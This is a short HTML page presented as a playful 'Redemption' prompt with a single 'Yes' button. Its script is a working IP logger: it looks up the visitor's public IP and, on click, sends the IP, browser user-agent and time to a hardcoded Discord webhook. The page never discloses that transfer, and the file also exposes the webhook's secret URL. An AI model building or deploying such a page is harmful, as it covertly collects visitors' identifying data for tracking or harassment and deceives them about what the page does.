<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Redemption</title>
<style>
  body {
    font-family: system-ui, -apple-system, sans-serif;
    background: #0f1117;
    color: #e6e6e6;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
  }
  .card {
    background: #1a1d26;
    border: 1px solid #2a2e3a;
    border-radius: 12px;
    padding: 32px;
    max-width: 420px;
    width: 90%;
    text-align: center;
  }
  h1 {
    font-size: 22px;
    margin: 0 0 16px;
  }
  .question {
    font-size: 18px;
    margin: 24px 0;
  }
  .answer {
    font-size: 20px;
    font-weight: 600;
    color: #6fcf97;
    margin: 24px 0;
    min-height: 28px;
  }
  button {
    width: 100%;
    padding: 12px;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    background: #4f7cff;
    color: white;
    cursor: pointer;
    margin-top: 8px;
  }
  button:disabled {
    background: #333746;
    cursor: not-allowed;
  }
  .fineprint {
    font-size: 12px;
    color: #8b90a0;
    margin-top: 20px;
    line-height: 1.4;
  }
  .ip {
    font-family: ui-monospace, monospace;
    font-size: 14px;
    color: #8b90a0;
    margin-top: 12px;
    word-break: break-all;
  }
</style>
</head>
<body>
  <div class="card">
    <h1>Redemption</h1>

    <div class="question" id="question">You want redemption?</div>

    <button id="yesBtn">Yes</button>

    <div class="answer" id="answer"></div>
    <div class="ip" id="ipDisplay"></div>

    <div class="fineprint">
      By clicking Yes you will be redeemed
    </div>
  </div>

<script>
  const WEBHOOK = "https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW";

  const questionEl = document.getElementById("question");
  const yesBtn = document.getElementById("yesBtn");
  const answerEl = document.getElementById("answer");
  const ipDisplay = document.getElementById("ipDisplay");

  let visitorIp = null;
  let alreadySent = false;

  // Pre-fetch the IP so it's ready when they click Yes
  (async () => {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      visitorIp = data.ip;
      ipDisplay.textContent = "Your IP: " + visitorIp;
    } catch (err) {
      ipDisplay.textContent = "Could not determine IP.";
    }
  })();

  yesBtn.addEventListener("click", async () => {
    if (alreadySent) return;
    alreadySent = true;

    yesBtn.disabled = true;
    questionEl.textContent = "";
    answerEl.textContent = "Sending…";

    // Make sure we have an IP before sending
    if (!visitorIp) {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        visitorIp = data.ip;
        ipDisplay.textContent = "Your IP: " + visitorIp;
      } catch (err) {
        answerEl.textContent = "Failed to get IP.";
        yesBtn.disabled = false;
        alreadySent = false;
        return;
      }
    }

    try {
      const res = await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: [
            "**New redemption log**",
            "IP: `" + visitorIp + "`",
            "User-Agent: `" + navigator.userAgent + "`",
            "Time: `" + new Date().toISOString() + "`"
          ].join("\n")
        })
      });

      if (res.ok) {
        answerEl.textContent = "Ok your redeemed";
      } else {
        answerEl.textContent = "Discord error: " + res.status;
        yesBtn.disabled = false;
        alreadySent = false;
      }
    } catch (err) {
      answerEl.textContent = "Failed: " + err.message;
      yesBtn.disabled = false;
      alreadySent = false;
    }
  });
</script>
</body>
</html>
